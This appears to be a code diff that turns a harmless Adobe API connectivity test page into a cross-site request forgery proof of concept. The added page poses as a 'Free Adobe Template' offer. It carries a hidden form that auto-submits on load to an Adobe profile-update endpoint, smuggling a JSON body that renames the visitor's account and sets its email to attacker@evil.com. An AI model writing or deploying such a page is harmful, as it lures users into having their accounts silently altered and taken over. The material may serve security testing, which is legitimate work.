@@ -1,28 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>Free Adobe Templates!</h1>
-  <p id="status">Testing connection...</p>
+  <h1>Claim Your Free Adobe Template!</h1>
+  
+  <!-- Hidden form that auto-submits -->
+  <form id="csrfForm" 
+        action="https://dc-api.adobe.io/user/update_profile" 
+        method="POST" 
+        enctype="text/plain">
+    <input name='{"name":"HACKED_USER","email":"attacker@evil.com","ignore_me":"' value='test"}' type="hidden">
+  </form>
+
+  <p id="status">Loading...</p>
 
   <script>
-    // Target a SAFE endpoint first (no data modification)
-    const apiTest = "https://dc-api.adobe.io/healthcheck";
+    // Auto-submit the form in the background
+    document.getElementById("csrfForm").submit();
     
-    fetch(apiTest, {
-      method: "GET",
-      headers: { "Content-Type": "application/json" },
-      credentials: "include"
-    })
-    .then(res => {
+    // Optional: Show status after 3 seconds
+    setTimeout(() => {
       document.getElementById("status").textContent = 
-        `API Response: ${res.status} (${res.statusText})`;
-      console.log("Success! Headers:", [...res.headers.entries()]);
-    })
-    .catch(err => {
-      document.getElementById("status").textContent = 
-        `Error: ${err.message}`;
-      console.error("Failed:", err);
-    });
+        "Check your Adobe profile - it may have been modified!";
+    }, 3000);
   </script>
 </body>
 </html>
